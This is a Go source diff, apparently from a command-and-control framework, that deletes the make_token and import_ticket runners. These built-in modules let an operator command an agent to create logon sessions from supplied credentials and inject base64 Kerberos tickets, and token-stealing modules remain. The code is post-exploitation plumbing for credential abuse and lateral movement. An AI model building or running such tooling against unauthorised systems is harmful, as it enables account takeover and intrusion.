@@ -32,10 +32,8 @@ var builtInGoModules = map[string]builtInGoModuleMeta{
 	def.ModStealToken: {C2Cmd: def.C2CmdStealToken, Special: true},
 	def.ModListTokens: {C2Cmd: def.C2CmdListTokens, Special: true},
 
-	// make_token / list_sessions / import_ticket use dedicated runners
-	def.ModMakeToken:    {C2Cmd: def.C2CmdMakeToken, Special: true},
+	// list_sessions uses a dedicated runner
 	def.ModListSessions: {C2Cmd: def.C2CmdListSessions, Special: true},
-	def.ModImportTicket: {C2Cmd: def.C2CmdImportTicket, Special: true},
 }
 
 func ensureBuiltInGoModuleRunners() {
@@ -46,14 +44,8 @@ func ensureBuiltInGoModuleRunners() {
 		if !hasModuleRunner(def.ModListTokens) {
 			registerModuleRunner(def.ModListTokens, runListTokens)
 		}
-		if !hasModuleRunner(def.ModMakeToken) {
-			registerModuleRunner(def.ModMakeToken, runMakeToken)
-		}
 		if !hasModuleRunner(def.ModListSessions) {
 			registerModuleRunner(def.ModListSessions, runListSessions)
-		}
-		if !hasModuleRunner(def.ModImportTicket) {
-			registerModuleRunner(def.ModImportTicket, runImportTicket)
 		}
 
 		def.Modules.Range(func(key, value any) bool {
@@ -236,45 +228,8 @@ func runListTokens(ctx *c2context.C2Context) {
 	}
 }
 
-// runMakeToken is the dedicated runner for the make_token built-in module.
-// It sends !make_token --user <user> [--domain <domain>] [--password <pwd>]
-// [--name <session>] to the target agent and logs a reminder about running
-// BOFs/starlark modules under the new session via the "token" option and
-// importing tickets with import_ticket.
-func runMakeToken(ctx *c2context.C2Context) {
-	if ctx.Target == nil {
-		logging.Errorf("make_token: no active agent")
-		return
-	}
-
-	user := strings.TrimSpace(ctx.Flags["user"])
-	if user == "" {
-		logging.Errorf("make_token: 'user' flag is required – pass it with: make_token --user <USER> [--domain <DOMAIN>]")
-		return
-	}
-
-	parts := []string{def.C2CmdMakeToken, "--user", strconv.Quote(user)}
-	for _, f := range []string{"domain", "password", "name"} {
-		if v := strings.TrimSpace(ctx.Flags[f]); v != "" {
-			parts = append(parts, "--"+f, strconv.Quote(v))
-		}
-	}
-	cmd := strings.Join(parts, " ")
-	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
-		logging.Errorf("make_token: sending command: %v", err)
-		return
-	}
-
-	sessionName := strings.TrimSpace(ctx.Flags["name"])
-	if sessionName == "" {
-		sessionName = user
-	}
-	logging.Infof("make_token: sent to %s (user=%s) – on success run BOF/starlark modules with --token %q and import tickets with: import_ticket --session %q --ticket <base64>",
-		ctx.Target.Tag, user, sessionName, sessionName)
-}
-
 // runListSessions sends !list_sessions to the target agent to dump all
-// make_token netlogon logon sessions.
+// netlogon logon sessions created by the --user module option.
 func runListSessions(ctx *c2context.C2Context) {
 	if ctx.Target == nil {
 		logging.Errorf("list_sessions: no active agent")
@@ -282,40 +237,5 @@ func runListSessions(ctx *c2context.C2Context) {
 	}
 	if err := CmdSender(def.C2CmdListSessions, "", ctx.Target.Tag); err != nil {
 		logging.Errorf("list_sessions: sending command: %v", err)
-	}
-}
-
-// runImportTicket is the dedicated runner for the import_ticket built-in
-// module. It sends !import_ticket --session <name>|--luid <hex> --ticket <b64>
-// to the target agent.
-func runImportTicket(ctx *c2context.C2Context) {
-	if ctx.Target == nil {
-		logging.Errorf("import_ticket: no active agent")
-		return
-	}
-
-	ticket := strings.TrimSpace(ctx.Flags["ticket"])
-	if ticket == "" {
-		logging.Errorf("import_ticket: 'ticket' flag is required – pass it with: import_ticket --session <NAME> --ticket <BASE64>")
-		return
-	}
-
-	session := strings.TrimSpace(ctx.Flags["session"])
-	luid := strings.TrimSpace(ctx.Flags["luid"])
-	if session == "" && luid == "" {
-		logging.Errorf("import_ticket: specify --session <NAME> or --luid <HEX> together with --ticket <BASE64>")
-		return
-	}
-
-	parts := []string{def.C2CmdImportTicket, "--ticket", strconv.Quote(ticket)}
-	if session != "" {
-		parts = append(parts, "--session", strconv.Quote(session))
-	}
-	if luid != "" {
-		parts = append(parts, "--luid", strconv.Quote(luid))
-	}
-	cmd := strings.Join(parts, " ")
-	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
-		logging.Errorf("import_ticket: sending command: %v", err)
 	}
 }
